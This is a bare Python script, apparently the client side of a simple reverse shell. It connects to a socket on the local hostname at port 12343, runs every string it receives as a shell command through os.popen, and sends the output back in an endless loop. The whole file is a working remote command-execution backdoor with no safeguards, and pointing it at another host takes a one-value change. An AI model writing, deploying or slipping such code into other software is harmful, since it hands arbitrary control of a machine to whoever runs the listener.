import socket
import os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((socket.gethostname(),12343))


while True:
    msg = str(s.recv(1024).decode("utf-8"))
    print(msg)
    print("Got it...")
    terminal = os.popen(msg).read()
    s.send(bytes(terminal,"utf-8"))
    print("Done.")
